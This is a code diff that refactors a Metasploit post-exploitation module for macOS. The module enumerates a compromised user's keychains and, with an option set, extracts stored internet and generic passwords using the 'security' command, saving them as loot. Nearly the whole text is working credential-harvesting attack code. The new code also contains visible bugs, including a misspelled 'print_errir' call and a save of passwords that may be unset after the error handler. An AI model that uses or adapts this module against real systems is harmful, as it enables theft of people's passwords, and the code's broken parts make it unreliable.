@@ -14,27 +14,28 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super(update_info(info,
-			'Name'			=> 'OSX Gather Enumerate Keychain',
-			'Description'	=> %q{
-				This module presents a way to quickly go through the current users keychains and collect data such as email accounts, servers, and other services.
+			'Name'          => 'OSX Gather Keychain Enumeration',
+			'Description'   => %q{
+				This module presents a way to quickly go through the current users keychains and
+				collect data such as email accounts, servers, and other services.
 			},
-			'License'		=> MSF_LICENSE,
-			'Author'		=> [ 'ipwnstuff <e@ipwnstuff.com>'],
-			'Platform'		=> [ 'osx' ],
-			'SessionTypes'	=> [ 'shell' ],
+			'License'       => MSF_LICENSE,
+			'Author'        => [ 'ipwnstuff <e[at]ipwnstuff.com>'],
+			'Platform'      => [ 'osx' ],
+			'SessionTypes'  => [ 'shell' ]
 		))
 
 		register_options(
 			[
-				OptBool.new('GETPASS',
-				[false, 'Adds passwords to the if the host clicks "allow" on prompt.', false]),
+				OptBool.new('GETPASS', [false, 'Adds passwords to the if the host clicks "allow" on prompt.', false])
 			], self.class)
 	end
 
 	def list_keychains
 		keychains = session.shell_command_token("security list")
 		user = session.shell_command_token("whoami")
-		print_status("The following keychains for #{user} were found:\n#{keychains.chomp}")
+		print_status("The following keychains for #{user.strip} were found:")
+		print_line(keychains.chomp)
 		return keychains =~ /No such file or directory/ ? nil : keychains
 	end
 
@@ -68,10 +69,14 @@ class Metasploit3 < Msf::Post
 	def get_passwords(accounts)
 		(1..accounts.count).each do |num|
 			if accounts[num].has_key?("srvr")
-				cmd = session.shell_command_token("security find-internet-password -ga \"#{accounts[num]["acct"]}\" -s \"#{accounts[num]["srvr"]}\" 2>&1")
+				c = 'find-internet-password'
+				s = accounts[num]["srvr"]
 			else
-				cmd = session.shell_command_token("security find-generic-password -ga \"#{accounts[num]["acct"]}\" -s \"#{accounts[num]["svce"]}\" 2>&1")
+				c = 'find-generic-password'
+				s = accounts[num]["svce"]
 			end
+
+			cmd = session.shell_command_token("security #{c} -ga \"#{accounts[num]["acct"]}\" -s \"#{s}\" 2>&1")
 
 			cmd.split("\n").each do |line|
 				if line =~ /password: /
@@ -86,38 +91,39 @@ class Metasploit3 < Msf::Post
 		return accounts
 	end
 
+
 	def save(data)
 		l = store_loot('macosx.keychain.info',
 			'plain/text',
 			session,
 			data,
-			'keychain-info.txt',
+			'keychain_info.txt',
 			'Mac Keychain Account/Server/Service/Description')
-			print_good("#{@peer} - Keychain information saved in #{l}")
+
+		print_good("#{@peer} - Keychain information saved in #{l}")
 	end
 
 	def run
 		@peer = "#{session.session_host}:#{session.session_port}"
-		
+
 		keychains = list_keychains
 		if keychains.nil?
 			print_error("#{@peer} - Module timed out, no keychains found.")
 			return
-		else
-			user = session.shell_command_token("/usr/bin/whoami").chomp
-			accounts = enum_accounts(keychains)
-			if datastore['GETPASS']
-				begin
+		end
+
+		user = session.shell_command_token("/usr/bin/whoami").chomp
+		accounts = enum_accounts(keychains)
+		save(accounts)
+
+		if datastore['GETPASS']
+			begin
 				passwords = get_passwords(accounts)
-				rescue
-				print_error("#{@peer} - Module timed out, no passwords found.\n This is likely due to the host not responding to the prompt.")
-				save(accounts)
-				return
-				end
-				save(passwords)
-			else
-				save(accounts)
+			rescue
+				print_error("#{@peer} - Module timed out, no passwords found.")
+				print_errir("#{@peer} - This is likely due to the host not responding to the prompt.")
 			end
+			save(passwords)
 		end
 	end
 
